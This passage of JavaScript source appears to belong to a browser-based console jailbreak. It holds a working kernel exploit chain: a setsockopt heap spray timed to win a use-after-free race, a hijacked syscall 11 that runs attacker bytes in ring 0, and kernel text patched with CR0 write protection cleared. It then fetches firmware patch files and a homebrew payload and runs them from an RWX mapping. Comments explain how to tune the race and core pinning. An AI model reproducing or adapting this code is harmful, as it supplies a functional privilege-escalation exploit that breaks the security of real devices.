       Batches are sized to the host's rop stack (0x2000) -- twelve slots a
       call, and room for the epilogue. */
    /* How many fit in one entry is a property of the host's rop stack, not
       of this console's speed -- a slower machine wants the same answer, just
       fewer entries would help it more. The stack size is the host's own
       constant, so ask instead of assuming: build the largest batch it
       accepts, once, outside the window. */
    if (STATE.batch === undefined && hh.prepareMany && stub) {
      STATE.batch = 0;
      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
        try {
          const probeCalls = [];
          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
          hh.prepareMany(probeCalls);
          STATE.batch = n; break;
        } catch (e) { /* too big for its stack, try smaller */ }
      }
      say("    rop stack takes " + STATE.batch + " calls per entry");
    }
    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
    const prepared = [];
    if (batch) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      for (let i = 0; i < calls.length; i += batch) {
        prepared.push(hh.prepareMany(calls.slice(i, i + batch)));
      }
      /* warm the path: the first entry of a run paid 19 ms where the rest
         paid 4, and that difference has no business being inside the window */
      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
    }

    const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    sc(S.close, doomed);
    if (batch) {
      for (let i = 0; i < prepared.length; i++) hh.runPrepared(prepared[i]);
    } else {
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
    }
    const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    this.window = t1 - t0;
    this.batched = batch;
    /* should the hole have stayed empty, a fresh clone drops a real pointer
       in, which makes the second arm() merely useless instead of fatal */
    for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

    this.sprayed = socks.length;
    const r = arm();
    for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
    say("    window " + this.window.toFixed(2) + " ms for " + socks.length
        + " setsockopt in " + (this.batched ? prepared.length : socks.length) + " entries");
    return r;
  };

  return s;
}

function ran(r) { return r !== null && r === -1; }

function qAt(buf, off) {
  return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
}

/* ----------------------------------------- ring 0 through syscall 11 */

/* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
   entered with rdi = thread and rsi = the argument vector, so the jump lands
   on whatever address the first argument carries.

   The original issues this with the loader's native call. A host whose
   syscall primitive takes an arbitrary number could call syscall 11 straight;
   raw13's sc() goes through a per-number stub table that has no entry for 11,
   so the two byte userland stub stays and is entered with callAddr. */
const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
const STAGE_MAX = 0x400;
const SIGIL = 0x600D600D;

function openRing0(roomAt) {
  const r = { at: roomAt, body: codeAt(roomAt, BODY) };
  codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  r.begin = function () { return this.body.reset(); };

  /* the gate returns the thread's value, not ours, so the body raises a flag
     of its own as its very last act and that is what we test */
  r.run = function () {
    this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at, FLAG), 0);
    host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
    return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
  };

  r.out = function () { return rd8(plus(this.at, OUT)); };

  r.thread = function () {
    this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
    return this.run() ? this.out() : null;
  };

  r.base = function () {
    const c = this.begin();
    c.hex("b9").dw(0xc0000082).hex("0f32");
    c.hex("48c1e220").hex("89c0").hex("4809c2");
    c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
    return this.run() ? plus(this.out(), -0x1c0) : null;
  };

  /* rep movsb inside the write protection bracket, so the same primitive
     serves kernel data and kernel text. Only writes need the bracket, and
     every clear of it is a window in which this thread must not be
     interrupted -- so reads do not open one. */
  r.copy = function (dst, src, len, guarded) {
    const c = this.begin();
    if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);
    c.hex("48be").qw(src);
    c.hex("48b9").qw(splitNum(len));
    c.hex("fc").hex("f3a4");
    if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  /* All of them in one entry, with the write protection lifted once. Several
     of these sit in the hottest routines in the kernel and the other cores
     keep running them; a patch written in its own call is a window in which
     one of them can fetch a half written instruction. */
  r.apply = function (base, list) {
    const c = this.begin();
    c.hex("48b9").qw(base);
    c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      if (bytes.length === 1) c.hex("c681");
      else if (bytes.length === 2) c.hex("66c781");
      else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.read = function (at, len) {
    len = len || 8;
    if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
    return rdbuf(plus(this.at, STAGE), len);
  };

  r.read_v = function (at) {
    const s = this.read(at, 8);
    if (!s) return null;
    let lo = 0, hi = 0;
    for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
    for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
    return v(lo, hi);
  };

  r.write = function (at, bytes) {
    wrbuf(plus(this.at, STAGE), bytes);
    return this.copy(at, plus(this.at, STAGE), bytes.length, true);
  };

  r.write_v = function (at, q) {
    const b = new Uint8Array(8);
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
    for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
    return this.write(at, b);
  };

  return r;
}

/* ------------------------------------------------------ the host's state */

function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

/* dynlib_get_info fills in the name here and nothing else -- no segment
   array, so no base -- and the mappings carry no path either. So identity
   comes from content: fifteen byte patterns at fixed offsets inside this
   module, which is a stronger fingerprint than a name would be. The map
   supplies the bounds, so every read lands inside a mapping that exists,
   and only mappings long enough to hold the whole span are touched.

   The listing is kept afterwards. The kernel walks its vm_map entries in
   address order and so does this one, so an index here is the same index
   there -- and the chain that walks the kernel side has to be told how far
   to go. Four times further than necessary is four times the ring 0 work
   on a hijacked stack. */
let MAPS = null;

function findLibByShape() {
  const r = { base: null, entries: 0, big: 0, first: [], note: null };
  MAPS = [];
  const pid = sc(S.getpid).i32;
  const mib = alloc(16);
  mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
  mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
  const len = alloc(8);
  len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
  let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
  let need = len.dv.getUint32(0, true);
  if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
  const buf = alloc(need + 0x8000);
  len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
  rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
  const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
  if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

  const span = HOST.last;                     /* everything we ever touch */
  const cand = [];
  let off = 0;
  while (off + 8 <= used) {
    const size = buf.dv.getInt32(off, true);
    if (size <= 0 || off + size > used) break;
    r.entries++;
    const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
    MAPS.push([start, stop]);
    if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
    const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
    if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
      cand.push(start); r.big++;
    }
    off += size;
  }

  /* two patterns, far apart, is already beyond coincidence */
  const probes = [GADGETS.pivot, GADGETS.memcpy];
  for (let i = 0; i < cand.length; i++) {
    let all = true;
    for (let k = 0; k < probes.length && all; k++) {
      const want = unhex(probes[k][1]);
      if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
    }
    if (all) { r.base = cand[i]; return r; }
  }
  r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
  return r;
}

/* Reports instead of returning a bare value: when this comes back empty the
   caller has to know whether the listing failed, the module was absent, or it
   was there with a zero base -- those need different answers, and a zero
   int64 is truthy, which is how a zero base once reached a read as a bare
   gadget offset. */
function findLib(name) {
  const r = { base: null, rv: null, count: 0, seen: [], note: null };
  const list = alloc(4 * 0x300), count = alloc(8);
  count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
  r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
  r.count = count.dv.getUint32(0, true);
  if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
  if (!r.count) { r.note = "the module list came back empty"; return r; }

  const info = alloc(0x160);
  for (let i = 0; i < r.count; i++) {
    info.u8.fill(0);
    info.dv.setUint32(0, 0x160, true);
    const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
    if (rv !== 0) continue;
    let nm = "";
    for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
    if (r.seen.length < 6) r.seen.push(nm);
    if (nm === name) {
      let b = qAt(info, 0x108);
      if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
      /* The segment array does not sit where it does in a game process. Let
         the struct say where it is instead of guessing: a module base is a
         userland address on the 16 KiB grid, and there are very few of those
         in 0x160 bytes. */
      const cand = [];
      for (let o = 8; o + 8 <= 0x160; o += 8) {
        const q = qAt(info, o);
        if (isZero(q)) continue;
        if (q.hi > 0x40) continue;
        if ((q.low & 0x3fff) !== 0) continue;
        cand.push("+0x" + o.toString(16) + "=" + text(q));
        if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
      }
      r.note = cand.length
        ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
        : "found " + name + " but no plausible base anywhere in the info struct";
      return r;
    }
  }
  r.note = name + " is not among the " + r.count + " modules";
  return r;
}

/* Which core we may run on is not ours to choose: this process is confined
   to a subset, and in a browser that subset does not contain core 0. Setting
   bit 0 regardless fails, the thread stays free to migrate, and then the free
   and the refill land in different per cpu buckets -- the hole is filled by
   somebody else and the pivot takes its stack pointer from a stranger. So ask
   first, then pin to the lowest core actually allowed. */
function pinCore() {
  const mask = alloc(16);
  mask.u8.fill(0);
  let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
  if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

  const allowed = [];
  for (let b = 0; b < 128; b++) {
    if ((mask.u8[b >> 3] >> (b & 7)) & 1) allowed.push(b);
  }
  if (!allowed.length) return { ok: false, note: "no core in the mask" };

  /* Every allowed core in turn, not just the lowest. On 04.11. setaffinity
     answered -1 although [6,7] were allowed, and the run gave up without
     ever having tried 7. Which core it ends up on does not matter -- all
     that is needed is that the free and the refill land on the same one. */
  const versuche = [];
  for (let i = 0; i < allowed.length; i++) {
    const core = allowed[i];
    mask.u8.fill(0);
    mask.u8[core >> 3] = 1 << (core & 7);
    rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
    versuche.push(core + ":rv" + rv);
    if (rv === 0) {
      return {
        ok: true, core: core, allowed: allowed.join(","),
        note: versuche.length > 1
          ? "setaffinity ok after " + versuche.join(" ")
          : "setaffinity rv=0",
      };
    }
  }
  return {
    ok: false, allowed: allowed.join(","),
    note: "every allowed core refused: " + versuche.join(" "),
  };
}

/* ------------------------------------------------------- the payload */

/* Fetch a file once. Both loaders are handed the bytes, so deciding the
   format does not cost a second request. */
/* `ms` bounds the wait. Without one, probing for a file that may or may not
   be there costs whatever the network decides -- with no route that was
   20-30 s on a console, and the run stands still meanwhile. What is allowed
   to fail must be allowed to fail FAST. Only probes get a bound; the payload
   itself waits as long as it takes, because for it there is no
   Rueckfall. */
async function fetchBytes(url, tag, ms) {
  let ctl = null, timer = null;
  try {
    if (ms && typeof AbortController === "function") {
      ctl = new AbortController();
      timer = setTimeout(function () { try { ctl.abort(); } catch (e) {} }, ms);
    }
    const r = await fetch(url, ctl ? { signal: ctl.signal } : undefined);
    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
    return new Uint8Array(await r.arrayBuffer());
  } catch (e) {
    const ab = e && (e.name === "AbortError" || /abort/i.test(e.message || ""));
    say("[" + tag + "] " + url + (ab ? " not there within " + ms + " ms"
                                     : " unreachable: " + (e && e.message)));
    return null;
  } finally {
    if (timer !== null) clearTimeout(timer);
  }
}

/* Firmware bin (1400.bin, 1402.bin, 1300.bin, ...) applied before GoldHEN. */
async function applyFwBin(room) {
  const c = host();
  if (STATE.ctx && STATE.ctx.params && STATE.ctx.params.get("fwbin") === "0") {
    say("[g] [0] fw bin skipped on request");
    return true;
  }
  let pset = null;
  {
    const fwBin = FW_KEY.replace(".", "") + ".bin";
    const candidates = [
      "slopkit/patches/" + fwBin,
      "patches/" + fwBin,
    ];
    for (let i = 0; i < candidates.length && !pset; i++) {
      try {
        const r2 = await fetch(candidates[i]);
        if (r2.ok) {
          pset = new Uint8Array(await r2.arrayBuffer());
          if (pset && pset.length) {
            say("[g] loaded " + candidates[i]);
            break;
          }
          pset = null;
        }
      } catch (e) {}
    }
  }
  if (!pset || !pset.length) {
    say("[g] no " + FW_KEY.replace(".", "") + ".bin for firmware " + FW_KEY
        + " -- GoldHEN will not be started without it");
    return false;
  }
  if (pset.length > 0x400 - 0xc0) {
    say("[g] " + FW_KEY.replace(".", "") + ".bin does not fit in the body area");
    return false;
  }
  wrbuf(plus(room, 0xc0), pset);
  const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
  say("[g] [0] " + FW_KEY.replace(".", "") + ".bin, " + pset.length + " bytes -> 0x"
      + ((pr && pr.lo >>> 0) || 0).toString(16));
  return true;
}

/* Which loader runs is decided by the CONTENT, not by the file name. There
   are two forms and they look alike from outside:
     - composite image: stub area plus payload at 0x50000, exactly
       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
       padding RW.
     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
       started as a thread.
   A GoldHEN loader is the second form; going by its name it would have taken
   the composite path and been rejected by the length check. */
async function loadEnabler(url, k, kbase, room) {
  const blob = await fetchBytes(url, "e");
  if (blob === null) return false;
  if (blob.length === GH.nlOff + GH.nlLen) {
    say("[e] " + blob.length + " bytes -- composite image, patch chain path");
    return loadGoldhen(url, k, kbase, room, blob);
  }
  if (blob.length && blob[0] === 0xe9) {
    say("[e] " + blob.length + " bytes, leading jmp -- raw payload path");
    // Here too: GoldHEN expects to find its patches in place.
    if (!(await applyFwBin(room))) return false;
    return loadPayload(url, blob);
  }
  say("[e] " + blob.length + " bytes: neither the composite image ("
      + (GH.nlOff + GH.nlLen) + ") nor a raw payload (leading jmp) -- refusing");
  return false;
}

/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
   goes into a page that is executable only because the kernel patch opened
   rwx, and it runs on its own thread so this one stays free. pthread_create
   is taken out of WebKit's import table and checked against libkernel before
   it is called -- a wrong pointer here runs the payload nowhere.

   Must come after the handles are defused: the enabler can restart SceShellUI,
   and if this process is torn down with the handles still live, that is the
   hang. */
async function loadPayload(url, preloaded) {
  const c = host();
  let blob = preloaded || null;
  if (blob === null) {
    blob = await fetchBytes(url, "p");
    if (blob === null) return false;
  }

  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
  if (blob[0] !== 0xe9) {
    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
    return false;
  }

  const size = (blob.length + 0x3fff) & ~0x3fff;
  const m = sc(S.mmap, 0, size, 7, 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap rwx failed, errno " + c.errno()); return false;
  }

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }

  /* The table blanks both pthread_create fields for 14.00, but only one of
     them deserved it: the import slot is an offset into WebKit, and 14.00
